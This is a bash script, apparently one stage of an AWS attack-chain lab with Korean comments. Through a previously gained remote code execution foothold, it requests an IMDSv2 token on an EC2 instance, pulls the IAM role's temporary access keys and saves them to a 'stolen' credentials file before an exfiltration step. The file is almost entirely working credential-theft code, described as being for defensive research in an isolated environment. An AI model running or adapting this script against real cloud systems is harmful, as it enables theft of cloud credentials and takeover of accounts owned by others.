#!/bin/bash
# 3단계: IMDSv2로 EC2 역할 임시 자격증명 탈취 (T1552.005)
# 범위: 본인 소유 격리 재현 환경 전용(방어 연구 목적). 사전: 01_rce.sh로 RCE 확보(TARGET_IP 필요).
# 결과는 stolen/creds.env (gitignore)로 저장.
#
# RCE로 확보한 원격 셸에서 IMDSv2를 조회한다. IMDSv2는 먼저 PUT으로 세션 토큰을 받고,
# 이후 GET 요청에 x-aws-ec2-metadata-token 헤더로 그 토큰을 실어야 한다.
# 인스턴스 내부(온박스)에서의 조회이므로 IMDSv2라도 그대로 도달한다. root 권한은 불필요.
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_common.sh"

# imds_get <경로접미사>
#   원격 sh에서 IMDSv2 토큰을 발급한 뒤 security-credentials/<접미사> 를 조회한다.
#   작은따옴표 블록은 원격에서 평가돼야 하는 $(...)·$TOKEN 을 로컬 확장에서 보호한다.
imds_get() {
  inject 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "x-aws-ec2-metadata-token-ttl-seconds: 60"); curl -s -H "x-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$1"
}

echo "[*] IMDSv2 토큰 발급 + 역할 이름 조회"
ROLE=$(imds_get "" | tr -d '[:space:]')
echo "    role = $ROLE"
[ -n "$ROLE" ] || { echo "[!] 역할 이름을 얻지 못했습니다. 앱 기동/RCE/IMDS 설정 확인."; exit 1; }

echo "[*] 임시 자격증명 획득"
JSON=$(imds_get "$ROLE")

# JSON 파싱을 먼저 검증하고, 성공했을 때만 creds.env를 기록한다.
# (IMDSv2 토큰 발급 실패 등으로 비정상 응답이 오면 기존 creds.env를 비워버리지 않도록)
CREDS=$(JSON="$JSON" python3 <<'PY'
import os, json, sys
try:
    d = json.loads(os.environ["JSON"])
    print(f"export AWS_ACCESS_KEY_ID={d['AccessKeyId']}")
    print(f"export AWS_SECRET_ACCESS_KEY={d['SecretAccessKey']}")
    print(f"export AWS_SESSION_TOKEN={d['Token']}")
except Exception as e:
    print("parse error: %s" % e, file=sys.stderr)
    sys.exit(1)
PY
) || { echo "[!] 자격증명 JSON 파싱 실패. IMDS 응답 앞부분:"; printf '%s' "$JSON" | head -c 300; echo; exit 1; }

mkdir -p stolen
printf '%s\n' "$CREDS" > stolen/creds.env

echo "[+] stolen/creds.env 저장 완료 (gitignore). 만료(Expiration):"
JSON="$JSON" python3 <<'PY'
import os, json
print("   ", json.loads(os.environ["JSON"]).get("Expiration"))
PY
echo "[i] 다음: source stolen/creds.env 후 04_exfil.sh"
